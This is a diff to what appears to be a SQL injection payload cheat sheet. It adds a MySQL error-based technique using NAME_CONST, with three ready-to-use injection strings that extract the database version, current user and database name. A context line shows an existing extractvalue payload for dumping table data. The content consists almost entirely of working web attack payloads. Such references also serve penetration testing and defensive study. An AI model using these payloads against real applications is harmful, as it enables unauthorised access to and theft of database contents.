@@ -220,6 +220,16 @@ Works with `MySQL >= 5.1`
 ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
 ```
 
+### MYSQL Error Based - NAME_CONST function (only for constants)
+
+Works with `MySQL >= 5.0`
+
+```sql
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
+```
+
 ## MYSQL Blind
 
 ### MYSQL Blind with substring equivalent
